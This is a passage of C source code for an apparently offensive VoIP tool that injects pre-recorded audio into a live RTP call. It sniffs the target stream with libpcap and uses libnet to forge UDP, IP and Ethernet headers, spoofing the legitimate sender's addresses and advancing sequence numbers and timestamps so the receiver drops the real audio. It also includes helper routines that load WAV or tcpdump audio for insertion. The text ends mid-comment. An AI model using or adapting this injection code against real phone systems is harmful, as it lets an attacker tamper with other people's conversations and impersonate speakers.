//  The destination endpoint is expected to view legitimate packets as being
//  late (delayed) compared to spoofed packets with advanced sequence number
//  and timestamp value. Hopefully, the receiving endpoint discards the
//  legitimate audio packets. The tool user is able to override the default factor
//  with an optional command line argument. The tool user is able to input
//  a positive or negative factor.
//
    
    for ( i = 0; i < numG711PacketEquivalents; i++ ) {
        
//
//  Extract the values from the legitimate RTP msg for spoofing as
//  as a future RTP msg in the audio stream.
//
        
        rtp_hdr = ( struct rfc1889_rtp_hdr * ) ( packet + offset_to_rtp_msg );
    
        spoofSeqNumber = ntohs ( rtp_hdr->sequenceNumber );
    
        spoofTimestamp = ntohl ( rtp_hdr->timestamp );
    
        spoofSSRC = ntohl ( rtp_hdr->ssrc );

//  
//  Insert the RTP msg header values into the next spoofed (i.e. inserted) RTP msg.
//  The key header values are advanced by a factor driven by an optional 
//  command line input (or by a default factor if the optional factor is not entered).
//
        
        rtp_msg_to_insert.rtp_hdr.sequenceNumber =
            htons ( ( unsigned short )
                      ( ( ( int ) spoofSeqNumber ) + spoofFactor ) );
        
        // note: for the G.711 codec, the timestamp is simply an increment of the
        //           of audio bytes comprising the payload. 
        
        rtp_msg_to_insert.rtp_hdr.timestamp =
            htonl ( spoofTimestamp + ( __RTPINSERTSOUND_G711_PAYLOAD_LEN *
                                       spoofFactor ) );
        
        rtp_msg_to_insert.rtp_hdr.ssrc = htonl ( spoofSSRC );
        
        memcpy ( &(rtp_msg_to_insert.rtp_payload[0]),
                 &(pcmuSamplesToInsert[i]),
                 __RTPINSERTSOUND_G711_PAYLOAD_LEN );
        
//
//      Update the UDP packet.
//

        udp_tag = libnet_build_udp (
                    rtpSrcPort,                       // source port
                    rtpDestPort,                      // destination port
                    LIBNET_UDP_H + g711_rtp_msg_len,  // total UDP packet length
                    0,                                // let libnet compute checksum
                    (u_int8_t *) &rtp_msg_to_insert,  // udp payload
                    g711_rtp_msg_len,                 // udp payload length
                    l,                                // libnet handle
                    udp_tag );                        // ptag - 0 = build new, !0 = reuse

        if ( udp_tag == -1 ) {
            printf ( "Looping: Can't build  UDP packet: %s\n",
                     libnet_geterror( l ) );
            CleanupAndExit ( EXIT_FAILURE );   //  control does not return
        }
        
        // 
        //  Note: libnet seems to have problems computing correct UDP checksums
        //             reliably. Since the UDP checksum is optional, it can be set to zeros
        //             (i.e. see the call to libnet_build_udp above) and a call to 
        //             libnet_toggle_checksum ()  can be used to disable the checksum
        //             calculation by libnet
        //
        
        libnet_toggle_checksum ( l, udp_tag, LIBNET_OFF );
        
//
//  Update the IP header by spoofing the necessary values from the received packet's
//  IP header.
//
        
        ip_hdr = ( struct libnet_ipv4_hdr * ) ( packet + offset_to_ip_hdr );

        spoofID = ntohs ( ip_hdr->ip_id );
        
        spoofID = ( unsigned short ) ( ( ( int ) spoofID ) + spoofFactor );

        ip_tag = libnet_build_ipv4 (
                ipPacketSize,               // size
                ip_hdr->ip_tos,             // ip tos
                spoofID,                    // ip id
//                ntohs ( ip_hdr->ip_id ),    // ip id
                ntohs ( ip_hdr->ip_off ),   // fragmentation bits
                ip_hdr->ip_ttl,             // ttl
                IPPROTO_UDP,                // protocol
                0,                          // let libnet compute checksum
                rtpSrcIPv4Addr,             // source address
                rtpDestIPv4Addr,            // destination address
                NULL,                       // payload
                0,                          // payload length
                l,                          // libnet context
                ip_tag );                   // ptag - 0 = build new, !0 = reuse
                            
        if ( ip_tag == -1 ) {
            printf ( "Looping: Can't build IP header: %s\n",
                     libnet_geterror( l ) );
            CleanupAndExit ( EXIT_FAILURE );
        }
        
#if __RTPINSERTSOUND_LIBNET_PROTOCOL_LAYER == __RTPINSERTSOUND_LIBNET_ETHERNET
    
//
//  Update the Ethernet header by spoofing the necessary values from
//  the received packet's Ethernet header
//
    
        eth_hdr = ( struct libnet_ethernet_hdr * ) packet;
        
        ether_tag = libnet_build_ethernet (
                (u_int8_t *) &(eth_hdr->ether_dhost), // dest mac
                (u_int8_t *) &(eth_hdr->ether_shost), // source mac
                ETHERTYPE_IP,                         // type upper layer protocol
                NULL,                                 // payload
                0,                                    // payload size
                l,                                    // libnet handle
                ether_tag );                          // ptag - 0 = build new, !0 = reuse
        
        if ( ether_tag == -1 ) {
            printf( "Can't build standard ethernet header: %s\n",
                    libnet_geterror( l ) );        
            CleanupAndExit( EXIT_FAILURE );
        }
    
#endif

//
//  Are we dealing with a phone that requires the reception of the
//  spoofed packet to be within a specified deltaT of when the phone
//  will receive the next legitimate packet?
//

        if ( jitterFactor < 80 ) {
            delayTransmitOfSpoofedPacket( __RTPINSERTSOUND_G711_CODEC_INTERVAL_USEC );
        }
    
//
//  Write the packet.
//

        bytesWritten = libnet_write( l );
        if ( bytesWritten == -1 ) {
            fprintf ( stderr, "Write error: %s\n", libnet_geterror( l ) );
            CleanupAndExit ( EXIT_FAILURE );   //  control does not return
        }

//
//  Make sure the number of written bytes jives with what we expect.
//

        if ( bytesWritten < ipPacketSize ) {
            fprintf ( stderr,
                     "Write error: libnet only wrote %d of %d bytes",
                     bytesWritten,
                     ipPacketSize );
            CleanupAndExit ( EXIT_FAILURE );   //  control does not return
        }
        
//
//  Wait for next legitimate audio packet as trigger to output next spoofed audio packet
// 

#if __RTPINSERTSOUND_LIBNET_PROTOCOL_LAYER == __RTPINSERTSOUND_LIBNET_ETHERNET
        
        //  No need for a loop to examine the content of "incoming" RTP
        //  packets to see if they're legitimate unless the tool is spoofing
        //  the Source MAC of the legitimate transmitter.
    
        bool bReceivedLegitimatePacket;
        bReceivedLegitimatePacket = false;
            
        while ( !bReceivedLegitimatePacket ) {

#endif        
            // Note: need this stuff regardless of whether the Source MAC of
            //            the legitimate transmitter is being spoofed by the tool.
            
            packet = NULL;
            
            rc = pcap_next_ex ( h_pcap_live_rtp, &ppcap_pkthdr, &packet );
        
            if ( rc == -1 ) {
                pcap_perror ( h_pcap_live_rtp,
                              "\nError: while attempting to sniff live audio : " );
                printf ( "\n" );
                CleanupAndExit ( EXIT_FAILURE );   //  control does not return here
            }
            
            if ( rc == 0 ) {
                printf ( "\nTimeout reported by pcap_next_ex( ), but"
                         "no timeout was requested.\n" ); 
                CleanupAndExit ( EXIT_FAILURE );   //  control does not return here
            }
        
#if __RTPINSERTSOUND_LIBNET_PROTOCOL_LAYER == __RTPINSERTSOUND_LIBNET_ETHERNET
                
            //  Since the Source MAC of outgoing RTP packets are being spoofed,
            //  we must make sure we prevent the tool from feeding upon its
            //  own output packets. See if the pattern 0,1,0,1,0,1 is endoded into 
            //  the low order bit of the first 6 bytes of the RTP payload.
            
            const u_char *pRTPpayload;
                
            pRTPpayload = packet + offset_to_rtp_payload;
                
            if ( ( ( *( pRTPpayload + 0 ) & 0x01 ) != 0 ) ||
                 ( ( *( pRTPpayload + 1 ) & 0x01 ) != 1 ) ||
                 ( ( *( pRTPpayload + 2 ) & 0x01 ) != 0 ) ||
                 ( ( *( pRTPpayload + 3 ) & 0x01 ) != 1 ) ||
                 ( ( *( pRTPpayload + 4 ) & 0x01 ) != 0 ) ||
                 ( ( *( pRTPpayload + 5 ) & 0x01 ) != 1 )    ) {
                 bReceivedLegitimatePacket = true;
            }
        } //  end while ( legitimate RTP packet not received )
        
#endif
    
    } //  end spoofed RTP packet output loop

    printf ( "\n\nInterlacing the pre-recorded audio with the\n"
             "target audio stream has completed.\n" );

    CleanupAndExit ( EXIT_SUCCESS );
        
} // end main

//-----------------------------------------------------------------------------
//
//  preloadWavAudio ( char *psInputAudioFile,
//                                        struct pcmu pcmSamplesToInsert[], 
//                                       unsigned int *numG711PacketEquivalents )
//
//  This routine expects psInputAudioFile to point to a  
//  string with the name of a file containing pre-recorded
//  audio to load into memory. The file is expected to be a
//  standard Microsoft multimedia RIFF formatted file
//  containing WAVE formated audio.
//
//  This routine shall confirm that the file content meets the
//  the following restrictions:
//
//  File type:                      Microsoft RIFF
//  File Resource Type:  WAVE
//  Compression Code:   PCM/uncompressed
//  Sample Frequency:   8000 Hz
//  Sample size:                unsigned 8-bit or signed 16-bit.
//
//  The file must have "chunks" in this order:
//
//     RIFF chunk
//     format chunk
//     fact chunk
//     data chunk
//
//   or
//
//     RIFF chunk
//     format chunk
//     data chunk
//
//  If the file does not comply with the required
//  configuration, the Linux sox command is
//  suggested as a means to convert the file
//  to the required configuration.
//
//  Pre-recorded audio content is read, converted to
//  PCMU, and loaded into memory. Responding to the
//  reception of each live RTP packet from the target
//  audio stream is a time critical event. So, getting 
//  the pre-recorded audio in a format ready to insert
//  into the live audio stream is beneficial. Reading, 
//  reading from a disk drive on an arbitrary platform
//  would yield unpredictable timing due to several
//  factors (e.g. speed of the machine, disk buffer sizes,
//  disk caching parameters, disk access time, ...etc).
//
//  Of course, swapping of the memory resident,
//  pre-recorded audio in PCM form to disk could
//  occur as a consequence of normal OS data paging
//  operation. 
//
//  FIXME: Declare that some data should remain
//                   memory-resident at all times.
//
//-----------------------------------------------------------------------------

bool preloadWavAudio ( char *psInputAudioFile,
                       struct pcmu pcmuSamplesToInsert[], 
                       unsigned int *numG711PacketEquivalents ) {
  
    FILE *fpAudio = NULL;
    
    int i, j, rc;
 
    struct {
        char           c_chunkID[4];        // Should be 4 ASCII characters        
        unsigned int   ui_chunkSize;        // i.e. does not include hdrCHUNK        
    } hdrCHUNK;
        
    struct {
        unsigned char c_chunkID[4];          // Should be the ASCII characters: RIFF        
        unsigned int  ui_audioFileSize;      // i.e. file size - 8        
        unsigned char c_typeRIFF[4];         // Should be the ASCII characters: WAVE
    } hdrRIFF;    
    
    //
    //  hdrFMT is the structure of the fmt chunk when there are no extra format bytes
    //  (i.e. when ui_fmtChunkSize = 16).
    //
    struct {
        char           c_chunkID[4];                   // Should be the ASCII characters: fmt<space>        
        unsigned int   ui_fmtChunkSize;                // i.e. 16 + extra format bytes        
        unsigned short us_compressionCode;             // 1 to 65535
        unsigned short us_numChannels;                 // 1 to 65535
        unsigned int   ui_sampleRate;                  // 1 to ( 2**32   - 1 )
        unsigned int   ui_avgBytesPerSec;              // 1 to ( 2**32   - 1 )
        unsigned short us_blockAlign;                  // 1 to 65535
        unsigned short us_numSignificantBitsPerSample; // 2 to 65535
    } hdrFMT;
    
//
//  Check that the audio input file has a standard RIFF header and that the
//  format type is: WAVE
//

    fpAudio = fopen ( psInputAudioFile, "r" );
    
    if ( !fpAudio ) {
        printf ( "\nCouldn't open pre-recorded audio file: %s\n",
                  psInputAudioFile );
        
        return false;
    }

    rc = fread ( &hdrRIFF, sizeof ( hdrRIFF ), 1, fpAudio );
    
    if ( rc != 1 ) {
        printf ( "\nEOF on input file attempting to read"
                 "\nthe standard RIFF header\n" );
        fclose ( fpAudio );
        fpAudio = NULL;

        return false;
    }

    if ( bVerbose ) {
        printf ( "\nAudio file format: %c%c%c%c  0x%0x 0x%0x 0x%0x 0x%0x \n",
                 hdrRIFF.c_chunkID[0],
                 hdrRIFF.c_chunkID[1],
                 hdrRIFF.c_chunkID[2],
                 hdrRIFF.c_chunkID[3],
                 hdrRIFF.c_chunkID[0],
                 hdrRIFF.c_chunkID[1],
                 hdrRIFF.c_chunkID[2],
                 hdrRIFF.c_chunkID[3]  );
    }
        
    if ( hdrRIFF.c_chunkID[0] != 'R' ||
         hdrRIFF.c_chunkID[1] != 'I' ||
         hdrRIFF.c_chunkID[2] != 'F' ||
         hdrRIFF.c_chunkID[3] != 'F' ) {
        printf ( "\nPre-recorded audio input does not have a standard RIFF header\n" );
        fclose ( fpAudio );
        fpAudio = NULL;
        
        return false;
    }

    if ( bVerbose ) {
        printf ( "\nTotal Audio File Size: %u\n", hdrRIFF.ui_audioFileSize + 8 );
        
        printf ( "\nPre-recorded audio content format: %c%c%c%c  0x%0x 0x%0x 0x%0x 0x%0x\n",
                 hdrRIFF.c_typeRIFF[0],
                 hdrRIFF.c_typeRIFF[1],
                 hdrRIFF.c_typeRIFF[2],
                 hdrRIFF.c_typeRIFF[3],
                 hdrRIFF.c_typeRIFF[0],
                 hdrRIFF.c_typeRIFF[1],
                 hdrRIFF.c_typeRIFF[2],
                 hdrRIFF.c_typeRIFF[3] );
    }
    
    if ( hdrRIFF.c_typeRIFF[0] != 'W' ||
         hdrRIFF.c_typeRIFF[1] != 'A' ||
         hdrRIFF.c_typeRIFF[2] != 'V' ||
         hdrRIFF.c_typeRIFF[3] != 'E' ) {
        printf ( "\nPre-recorded audio input is not in WAVE format\n" );
        fclose ( fpAudio );
        fpAudio = NULL;

        return false;
    }
    
//
//  Check that the audio input file has a standard "fmt " chunk following the 
//  RIFF chunk. The "fmt " chunk contains the parameters of the audio
//  data.
//
    
    rc = fread ( &hdrFMT, sizeof ( hdrFMT ), 1, fpAudio );
    
    if ( rc != 1 ) {
        printf ( "\nEOF on input file attempting to read"
                 "\nthe standard RIFF fmt header\n" );
        fclose ( fpAudio );
        fpAudio = NULL;

        return false;
    }

    if ( bVerbose ) {
        printf ( "\nNext \"chunk\" header type: %c%c%c%c  0x%0x 0x%0x 0x%0x 0x%0x\n",
                 hdrFMT.c_chunkID[0],
                 hdrFMT.c_chunkID[1],
                 hdrFMT.c_chunkID[2],
                 hdrFMT.c_chunkID[3],
                 hdrFMT.c_chunkID[0],
                 hdrFMT.c_chunkID[1],
                 hdrFMT.c_chunkID[2],
                 hdrFMT.c_chunkID[3] );
    }
    
    if ( hdrFMT.c_chunkID[0] != 'f' ||
         hdrFMT.c_chunkID[1] != 'm' ||
         hdrFMT.c_chunkID[2] != 't' ||
         hdrFMT.c_chunkID[3] != ' ' ) {
        printf ( "\nRIFF header not followed by fmt header\n" );
        fclose ( fpAudio );
        fpAudio = NULL;

        return false;
    }

    if ( bVerbose ) {
        printf ( "\nCompression Code:        %u",   hdrFMT.us_compressionCode );
        printf ( "\nChannels:                %u",   hdrFMT.us_numChannels );
        printf ( "\nSample Rate (Hz):        %u",   hdrFMT.ui_sampleRate );
        printf ( "\nAvg. Bytes/sec:          %u",   hdrFMT.ui_avgBytesPerSec );
        printf ( "\nBlock Align:             %u",   hdrFMT.us_blockAlign );
        printf ( "\nSignificant Bits/sample: %u",   hdrFMT.us_numSignificantBitsPerSample );
    }
    
    if ( hdrFMT.ui_fmtChunkSize > 16 ) {
        printf ( "\n\nThe fmt chunk has %u Extra Format Bytes."
                 "\nExtra format bytes are not supported.\n",
                 hdrFMT.ui_fmtChunkSize - 16 );
        
        printf ( "\nYou might be able to use the Linux 'sox' command"
                 "\nto convert your WAVE file from its current"
                 "\nformat to the format required by this tool"
                 "\nTo see a limited output of your file's parameters"
                 "\nyou may execute this tool using the verbose option"
                 "\n(i.e. -v) or the following sox command for a"
                 "\nmore comprehensive assessment:"
                 "\n   sox -V %s -e stat\n",
                 psInputAudioFile );
        fclose ( fpAudio );
        fpAudio = NULL;

        return false;
    }

//
//  Determine the chunk id of the chunk following the "fmt " chunk
//  when there are no extra format bytes
//
    
    rc = fread ( &hdrCHUNK, sizeof ( hdrCHUNK ), 1, fpAudio );
    
    if ( rc != 1 ) {
        printf ( "\nEOF on input file attempting to read"
                 "\nthe chunk header following the fmt chunk\n" );
        fclose ( fpAudio );
        fpAudio = NULL;

        return false;
    }

    if ( bVerbose ) {
        printf ( "\n\nNext \"chunk\" header type: %c%c%c%c  0x%0x 0x%0x 0x%0x 0x%0x\n",
                 hdrCHUNK.c_chunkID[0],
                 hdrCHUNK.c_chunkID[1],
                 hdrCHUNK.c_chunkID[2],
                 hdrCHUNK.c_chunkID[3],
                 hdrCHUNK.c_chunkID[0],
                 hdrCHUNK.c_chunkID[1],
                 hdrCHUNK.c_chunkID[2],
                 hdrCHUNK.c_chunkID[3] );
    
        printf ( "chunk data size: %u\n", hdrCHUNK.ui_chunkSize );
    }
    
//
//  The tool requires the chunk header just read to be either a 'fact' chunk or a 'data' chunk
//
    
    if ( hdrCHUNK.c_chunkID[0] == 'f' &&
         hdrCHUNK.c_chunkID[1] == 'a' &&
         hdrCHUNK.c_chunkID[2] == 'c' &&
         hdrCHUNK.c_chunkID[3] == 't' ) {
        
        unsigned int ui_numSamplesInWaveformChunk = 0;

        rc = fread ( &ui_numSamplesInWaveformChunk,
                     sizeof ( ui_numSamplesInWaveformChunk ),
                     1,
                     fpAudio );
        
        if ( rc != 1 ) {
            printf ( "\nEOF on input file attempting to read"
                     "\nthe content of a \"fact\" chunk\n" );
            fclose ( fpAudio );
            fpAudio = NULL;

            return false;
        }                
             
        if ( bVerbose ) {
            printf ( "Number of samples in waveform data chunk: %u\n",
                      ui_numSamplesInWaveformChunk );
        }
        
        //
        //  This tool now requires the next chunk to be the 'data' chunk.
        //
        
        rc = fread ( &hdrCHUNK, sizeof ( hdrCHUNK ), 1, fpAudio );
        
        if ( rc != 1 ) {
            printf ( "\nEOF on input file attempting to read"
                     "\nthe chunk header following the fmt chunk\n" );
            fclose ( fpAudio );
            fpAudio = NULL;

            return false;
        }

        if ( bVerbose ) {
            printf ( "\nNext \"chunk\" header type: %c%c%c%c  0x%0x 0x%0x 0x%0x 0x%0x\n",
                     hdrCHUNK.c_chunkID[0],
                     hdrCHUNK.c_chunkID[1],
                     hdrCHUNK.c_chunkID[2],
                     hdrCHUNK.c_chunkID[3],
                     hdrCHUNK.c_chunkID[0],
                     hdrCHUNK.c_chunkID[1],
                     hdrCHUNK.c_chunkID[2],
                     hdrCHUNK.c_chunkID[3] );
        
            printf ( "chunk data size: %u\n", hdrCHUNK.ui_chunkSize );
        }
    }

//
//  The chunk just read must be the 'data' chunk
//

    if ( hdrCHUNK.c_chunkID[0] != 'd' ||
         hdrCHUNK.c_chunkID[1] != 'a' ||
         hdrCHUNK.c_chunkID[2] != 't' ||
         hdrCHUNK.c_chunkID[3] != 'a' ) {
        printf ( "\nThis tool supports only two sequences of RIFF WAVE file"
                 "\nchunks:\n"
                 "\n   RIFF, fmt, fact, data"
                 "\n       or"
                 "\n   RIFF, fmt, data\n"
                 "\nAn unsupported chunk header was encountered.\n" );
             
        printf ( "\nYou might be able to use the Linux 'sox' command"
                 "\nto convert your WAVE file from its current"
                 "\nformat to the format required by this tool."
                 "\nTo see a limited output of your file's parameters,"
                 "\nyou may execute this tool using the verbose"
                 "\noption (i.e. -v) or the following sox command"
                 "\nfor a more comprehensive assessment:"
                 "\n   sox -V %s -e stat\n",
                 psInputAudioFile );             
        fclose ( fpAudio );
        fpAudio = NULL;
  
        return false;
    }
    
//
//  The file appears to okay with respect to the sequence of chunk headers.
//  Now make sure that the fmt chunk information describes audio 
//  content that complies with the constraints of this tool.
//
    
    if ( hdrFMT.us_compressionCode !=
         __RTPINSERTSOUND_PCM_UNCOMPRESSED_COMPRESSION_CODE ) {
        printf ( "\nThe WAVE file compression format of your audio"
                 "\nfile is not supported. Only code = 1 is supported"
                 "\n(i.e. PCM/Uncompressed). Compression code"
                 "\nspecified by audio file is: %u\n",
                 hdrFMT.us_compressionCode );
        
        printf ( "\nYou might be able to use the Linux 'sox' command"
                 "\nto convert your WAVE file from its current"
                 "\ncompression to the PCM/Uncompressed format"
                 "\nrequired by this tool. To see a limited output"
                 "\nof your file's parameters you may execute this"
                 "\ntool using the verbose option (i.e. -v) or the"
                 "\nfollowing sox command for a more comprehensive"
                 "\nassessment:"
                 "\n   sox -V %s -e stat\n",
                 psInputAudioFile );             
        fclose ( fpAudio );
        fpAudio = NULL;
  
        return false;
    }

    if ( hdrFMT.us_numChannels != 1 ) {
        printf ( "\nThe number of audio channels in your audio file"
                 "\nis not supported. Only mono (i.e. 1 channel) is"
                 "\nsupported. The number of audio channels in your"
                 "\naudio is: %u\n",
                 hdrFMT.us_numChannels );
        
        printf ( "\nYou might be able to use the Linux 'sox' command"
                 "\nto convert your WAVE file from its current"
                 "\nnumber of audio channels to the mono format"
                 "\nrequired by this tool. To see a limited output"
                 "\nof your file's parameters you may execute this"
                 "\ntool using the verbose option (i.e. -v) or the"
                 "\nfollowing sox command for a more comprehensive"
                 "\nassessment:"
                 "\n   sox -V %s -e stat\n",
                 psInputAudioFile );
        fclose ( fpAudio );
        fpAudio = NULL;

        return false;
    }        

    if ( hdrFMT.ui_sampleRate != 8000 ) {
        printf ( "\nThe sample rate of your audio file is not supported."
                 "\nOnly 8000 Hz is supported. The sample rate of"
                 "\nyour audio is: %u Hz\n",
                 hdrFMT.ui_sampleRate );
        
        printf ( "\nYou might be able to use the Linux 'sox' command"
                 "\nto convert your WAVE file from its current"
                 "\nsample rate to the 8000 Hz required by this tool."
                 "\nTo see a limited output of your file's parameters"
                 "\nyou may execute this tool using the verbose option"
                 "\n(i.e. -v) or the following sox command for a more"
                 "\ncomprehensive assessment:"
                 "\n   sox -V %s -e stat\n",
                 psInputAudioFile );
        fclose ( fpAudio );
        fpAudio = NULL;

        return false;
    }
    
    if ( hdrFMT.us_numSignificantBitsPerSample != 8  &&
         hdrFMT.us_numSignificantBitsPerSample != 16    ) {
        printf ( "\nThe number of significant bits per audio sample"
                 "\nof your audio file is not supported. Only 8 or"
                 "\n16 bits per sample is supported. The number of"
                 "\nsignificant bits of your audio is: %u\n",
                 hdrFMT.us_numSignificantBitsPerSample );
        
        printf ( "\nYou might be able to use the Linux 'sox' command"
                 "\nto convert your WAVE file from its current number"
                 "\nof significant bits/sample to the 8 or 16 required"
                 "\nby this tool. To see a limited output of your file's"
                 "\nparameters you may execute this tool using the"
                 "\nverbose option (i.e. -v) or the following sox"
                 "\ncommand for a more comprehensive assessment:"
                 "\n   sox -V %s -e stat\n",
                 psInputAudioFile );
        fclose ( fpAudio );
        fpAudio = NULL;

        return false;
    }
    
//
//  Read, convert (if necessary), and load audio data into the
//  memory stipulated to this function. Limit the magnitude
//  of the audio to the number of specified G.711 packet equivalents.
//
    
    if ( hdrFMT.us_numSignificantBitsPerSample == 16 ) {
        
        //
        //  Read each signed, linear 16-bit PCM value, convert
        //  it to PCMU, and load it into memory
        //
        
        short wavePCM;
        
        for ( i = 0;
              i < __RTPINSERTSOUND_G711_MAX_NUMBER_RTP_MSGS_TO_INSERT;
              i++ ) {
                  
            for ( j = 0;
                  j < __RTPINSERTSOUND_G711_PAYLOAD_LEN;
                  j++ ) {
                
                rc = fread ( &wavePCM,
                             sizeof ( wavePCM ),
                             1,
                             fpAudio );
            
                if ( rc != 1 ) {
                    
                    //
                    //  Less than a complete G.711 packet equivalent audio remained in
                    //  the audio file. So, return only the number of complete G.711
                    //  packet equivalents to the caller.
                    //
                
                    *numG711PacketEquivalents = i;
                    fclose ( fpAudio );
                    fpAudio = NULL;
    
                    return true;                
                }
                
                pcmuSamplesToInsert[i].pcmu_value[j] = linear2ulaw ( wavePCM );
            }
            
#if __RTPINSERTSOUND_LIBNET_PROTOCOL_LAYER == __RTPINSERTSOUND_LIBNET_ETHERNET

            //  Since the Source MAC of the legitimate RTP transmitter is going to be 
            //  spoofed, mark the spoofed packets so this tool will know to reject "incoming"
            //  packets with that mark. The "mark" is the pattern 0,1,0,1,0,1 in the low
            //   order bit of the first 6 RTP payload bytes. 

            pcmuSamplesToInsert[ i ].pcmu_value[ 0 ] =              
                pcmuSamplesToInsert[ i ].pcmu_value[ 0 ] & 0xfe;
            pcmuSamplesToInsert[ i ].pcmu_value[ 1 ] =              
                pcmuSamplesToInsert[ i ].pcmu_value[ 1 ] | 0x01;
            pcmuSamplesToInsert[ i ].pcmu_value[ 2 ] =              
                pcmuSamplesToInsert[ i ].pcmu_value[ 2 ] & 0xfe;
            pcmuSamplesToInsert[ i ].pcmu_value[ 3 ] =              
                pcmuSamplesToInsert[ i ].pcmu_value[ 3 ] | 0x01;
            pcmuSamplesToInsert[ i ].pcmu_value[ 4 ] =              
                pcmuSamplesToInsert[ i ].pcmu_value[ 4 ] & 0xfe;
            pcmuSamplesToInsert[ i ].pcmu_value[ 5 ] =              
                pcmuSamplesToInsert[ i ].pcmu_value[ 5 ] | 0x01;

#endif

        }

        *numG711PacketEquivalents = i;        
        fclose ( fpAudio );
        fpAudio = NULL;
        
        return true;
    }
    
//
//  Because of the test above, the only other possibility is that the
//  number of significant bits/sample must be 8, but a test is made
//  here - just in case the above logic is modified at a future date
//
    
    if ( hdrFMT.us_numSignificantBitsPerSample == 8 ) {
        
        //
        //  The audio needs to be converted from unsigned, 8-bit to signed, 16-bit
        //  Even though, by convention, 8-bit PCM is referred to as unsigned, it
        //  is scaled
        //
        
        signed char wavePCM;
        
        for ( i = 0;
              i < __RTPINSERTSOUND_G711_MAX_NUMBER_RTP_MSGS_TO_INSERT;
              i++ ) {
                  
            for ( j = 0;
                  j < __RTPINSERTSOUND_G711_PAYLOAD_LEN;
                  j++ ) {
             
                rc = fread ( &wavePCM,
                             sizeof ( wavePCM ),
                             1,
                             fpAudio );
                
                if ( rc != 1 ) {
                    
                    //
                    //  Less than a complete G.711 packet equivalent audio remained in
                    //  the audio file. So, return only the number of complete G.711
                    //  packet equivalents to the caller.
                    //
                
                    *numG711PacketEquivalents = i;
                    fclose ( fpAudio );
                    fpAudio = NULL;
    
                    return true;                
                }
            
                pcmuSamplesToInsert[i].pcmu_value[j] =
                    linear2ulaw ( (( (int) wavePCM ) << 8 ) - 32768 );
            }
            
#if __RTPINSERTSOUND_LIBNET_PROTOCOL_LAYER == __RTPINSERTSOUND_LIBNET_ETHERNET

            //  Since the Source MAC of the legitimate RTP transmitter is going to be 
            //  spoofed, mark the spoofed packets so this tool will know to reject "incoming"
            //  packets with that mark. The "mark" is the pattern 0,1,0,1,0,1 in the low
            //   order bit of the first 6 RTP payload bytes. 

            pcmuSamplesToInsert[ i ].pcmu_value[ 0 ] =              
                pcmuSamplesToInsert[ i ].pcmu_value[ 0 ] & 0xfe;
            pcmuSamplesToInsert[ i ].pcmu_value[ 1 ] =              
                pcmuSamplesToInsert[ i ].pcmu_value[ 1 ] | 0x01;
            pcmuSamplesToInsert[ i ].pcmu_value[ 2 ] =              
                pcmuSamplesToInsert[ i ].pcmu_value[ 2 ] & 0xfe;
            pcmuSamplesToInsert[ i ].pcmu_value[ 3 ] =              
                pcmuSamplesToInsert[ i ].pcmu_value[ 3 ] | 0x01;
            pcmuSamplesToInsert[ i ].pcmu_value[ 4 ] =              
                pcmuSamplesToInsert[ i ].pcmu_value[ 4 ] & 0xfe;
            pcmuSamplesToInsert[ i ].pcmu_value[ 5 ] =              
                pcmuSamplesToInsert[ i ].pcmu_value[ 5 ] | 0x01;

#endif            
        }
        
        *numG711PacketEquivalents = i;
        fclose ( fpAudio );
        fpAudio = NULL;
 
        return true;
    }
    
    return false;

} // end preloadWavAudio


//-----------------------------------------------------------------------------
//
//  preloadTCPdumpAudio ( char *psInputAudioFile,
//                                                   struct pcmuSamplesToInsert[], 
//                                                  unsigned int *numG711PacketsLoaded )
//
//  This routine expects psInputAudioFile to point to a  
//  string with the name of file containing the pre-recorded
//  audio to load into memory. The file is expected to be a
//  standard libpcap tcpdump formatted file containing
//  G.711 PCMU RTP/UDP/IP/ETHERNET messages.
//
//  The pre-recorded audio is in the desired form. Extract
//  it from the recoreded message and load it into memory
//  pointed to by the 2nd argument to this function.
//
//  Inserting audio packets into the target audio stream
//  is a time critical process. Audio is pre-loaded into
//  memory because attempting to read from a disk
//  drive in real-time on an arbitrary platform would
//  yield unpredictable timing due to several factors
//  (e.g. speed of the machine, disk buffer sizes, disk
//  caching parameters, disk access time, ...etc).
//
//  Of course, swapping of the memory resident,
//  pre-recorded audio in PCM form to disk could
//  occur as a consequence of normal OS data paging
//  operation.
//
//  The memory area to load is specified by the
//  second parameter. It is a pointer to an array of an
//  array of PCMU values. Each increment of the
//  outer array index represents the number of
//  of audio samples transmitted in a single G.711
//  packet (i.e. __RTPINSERTSOUND_G711_PAYLOAD_LEN).
//  The memory area must be large enough to contain
//  __RTPINSERTSOUND_G711_MAX_NUMBER_RTP_MSGS_TO_INSERT
//  of __RTPINSERTSOUND_G711_PAYLOAD_LEN
//  8-bit, unsigned, PCMU values.
//
//  The number of G711 packets whose audio was
//  loaded into memory is returned to the calling routine
//  thru the 3rd argument to this function.
//
//  The return value of this function is:
//    false - when a failure to load pre-recorded audio occurs
//    true  - when pre-recorded audio is loaded succsssfully
//  
//  FIXME: Declare that some data should remain
//                   memory-resident at all times.
//
//-----------------------------------------------------------------------------

bool  preloadTCPdumpAudio ( char *psInputAudioFile,
                            struct pcmu pcmuSamplesToInsert[], 
                            unsigned int *numG711PacketsLoaded ) {

    unsigned int i;
    unsigned int numPackets = 0;

    unsigned char *pUlawByte  = NULL;

    char pcap_errbuf[ PCAP_ERRBUF_SIZE ];

    pcap_t *h_pcap_tcpdump_rtp = NULL;  //  libpcap "handle"
  
    struct pcap_pkthdr *ppcap_pkthdr = NULL;
    struct pcap_pkthdr pcap_header;

    bool bPacketsRemain = true;

    *numG711PacketsLoaded = 0;

//
//  Read pre-recorded audio from the RTP packets stored in
//  the specified tcpdump file. 
//
    
    h_pcap_tcpdump_rtp =
        pcap_open_offline ( psInputAudioFile, pcap_errbuf );
    
    if ( h_pcap_tcpdump_rtp == NULL ) {
        printf ( "\nCouldn't open pre-recorded RTP audio file %s: %s\n",
                  psInputAudioFile, pcap_errbuf );
        return false;
    }
    
    printf ( "\n\nReading pre-recorded G.711 PCMU audio from input audio"
             "\nfile and loading it into memory. This is the audio to"
             "\ninsert into the target live audio stream.\n" );
    
    do {

        //
        //  FIXME:  One outstanding question is whether repeated calls to
        //                   pcap_next_ex( ) result in additional memory being
        //                   consumed. Or, is only - at most - one packet's worth of
        //                   memory consumed despite repeated calls to pcap_next_ex( ).
        //                   After all, the objective of this part of the code is to load
        //                   into memory all of the audio  you'd like to insert into a
        //                   targeted conversion.
        //
        //                   The working presumption until this question can be
        //                   answered is that repeated calls to pcap_next_ex( ) result
        //                   in only one packet's worth of memory being consumed.
        //                   (i.e. the pcap_next_ex( ) routine releases memory for
        //                   the packet "returned" in a prior call and allocates
